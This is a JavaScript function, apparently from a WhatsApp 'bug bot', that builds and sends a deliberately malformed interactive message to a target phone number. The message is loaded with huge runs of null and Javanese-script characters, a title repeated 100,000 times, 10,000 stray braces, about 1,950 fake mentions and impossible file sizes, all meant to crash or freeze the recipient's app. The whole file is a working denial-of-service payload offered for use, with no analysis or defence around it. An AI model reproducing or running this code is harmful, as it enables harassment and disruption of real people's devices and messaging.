async function delayButton(isTarget, fJids) {
let buttonMents = Array.from({ length: 1950 }, () =>
    `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
  );
  const msg = generateWAMessageFromContent(isTarget, {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
            title: "",
            documentMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
              mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
              fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
              fileLength: "9999999999999",
              pageCount: 9007199254740991,
              mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
              fileName: "\u0000".repeat(1000),
              fileEncSha256: "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
              directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc",
              mediaKeyTimestamp: "1723855952",
              contactVcard: true,
              thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc",
              thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
              thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
              jpegThumbnail: Buffer.from(await (await fetch("https://files.catbox.moe/ykvioj.jpg")).arrayBuffer()),
            },
            hasMediaAttachment: true
          },
          body: {
            text: "APA ITU CINTA...." +
                 "\u0000".repeat(7500) +
                 "ꦽ".repeat(45000)
          },
          nativeFlowMessage: {
            buttons: [
              {
                name: "galaxy_message",
                buttonParamsJson: "{}"
              },
              {
                name: "single_select",
                buttonParamsJson: "{}"
              },
              {
                name: "send_location",
                buttonParamsJson: "{}"
              },
              {
                name: "cta_url",
                buttonParamsJson: JSON.stringify({
                  display_text: "BERHARAP UNTUK SABAR",
                  url: `https://sock.app/${"ꦾ".repeat(5000)}`,
                  merchant_url: `https://sock.app/${"ꦾ".repeat(5000)}`
                })
              }
            ],
            messageParamsJson: "{".repeat(10000)
          },
          contextInfo: {
            mentionedJid: buttonMents,
            participant: "13135550002@s.whatsapp.net", 
            remoteJid: "status@broadcast",
            forwardingScore: 9741,
            isForwarded: true,
            quotedMessage: {
              callLogMesssage: {
                isVideo: false,
                callOutcome: "ONGOING",
                durationSecs: "9999",
                callType: "VOICE_CHAT",
                participants: [
                  { jid: isTarget, callOutcome: "ONGOING" },
                  { jid: "0@s.whatsapp.net", callOutcome: "ONGOING" }
                ]
              }
            },
            placeholderKey: {
              remoteJid: "0@s.whatsapp.net",
              fromMe: false,
              id: "9741OURQ"
            },
            disappearingMode: {
              initiator: "CHANGED_IN_CHAT",
              trigger: "CHAT_SETTING"
            },
            forwardedNewsletterMessageInfo: {
              newsletterName: " AMELIA OVERLOAD ",
              newsletterJid: "120363321999999999@newsletter",
              serverMessageId: 1
            },
            externalAdReply: {
              showAdAttribution: true,
              title: "ោ៝".repeat(100000),
              body: "",
              thumbnailUrl: null,
              sourceUrl: null,
              mediaType: 1,
              renderLargerThumbnail: true
            }
          }
        }
      }
    }
  }, {
    userJid: isTarget
  });

  await sock.relayMessage(
    isTarget,
    msg.message,
    fJids
      ? { participant: { jid: isTarget, messageId: msg.key.id } }
      : {}
  );
  console.log(chalk.yellow(' (!!!) - AMELIA... SUCCSS SENT'))
}
